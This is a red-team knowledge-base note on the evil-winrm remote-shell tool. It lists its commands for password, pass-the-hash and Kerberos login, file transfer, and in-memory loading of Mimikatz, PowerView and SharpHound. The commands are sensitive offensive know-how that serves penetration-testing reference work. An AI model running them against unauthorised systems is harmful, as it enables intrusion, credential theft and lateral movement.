---
title: evil-winrm
aliases: ["evil-winrm", "Evil-WinRM"]
type: tool
domain: [red-team]
tags: [type/tool, domain/red-team]
source: "Hackplayers"
source_url: "https://github.com/Hackplayers/evil-winrm"
verified: true
related: ["[[Remote Execution & Lateral Movement (Windows)]]", "[[Pass-the-Hash]]", "[[Kerberos]]"]
created: 2026-06-07
updated: 2026-06-07
---

# evil-winrm

> [!summary] One-liner
> A Ruby-based WinRM shell client for pentesting — provides an interactive PowerShell session over HTTP/HTTPS (port 5985/5986) with built-in upload/download, in-memory module loading, and pass-the-hash support.

## Usage
```bash
# Password auth
evil-winrm -i <TARGET> -u <USER> -p <PASS>

# Pass-the-hash
evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>

# Kerberos auth
evil-winrm -i <TARGET> -r <DOMAIN> --kerberos

# Upload/download files
upload /local/path /remote/path
download C:\remote\file /local/path

# Load PowerShell scripts in-memory
evil-winrm -i <TARGET> -u <USER> -p <PASS> -s /scripts/dir/
# Then: menu → Invoke-Mimikatz, PowerView, etc.

# Load C# assemblies (execute-assembly equivalent)
evil-winrm -i <TARGET> -u <USER> -p <PASS> -e /assemblies/dir/
# Then: Invoke-Binary SharpHound.exe
```

## Requirements
- WinRM must be enabled on the target (port 5985 HTTP or 5986 HTTPS).
- User must be in the **Remote Management Users** group (or local admin).

## Related
- Lateral movement: [[Remote Execution & Lateral Movement (Windows)]].
- Alternatives: [[PsExec]], [[wmiexec]], [[Impacket]].
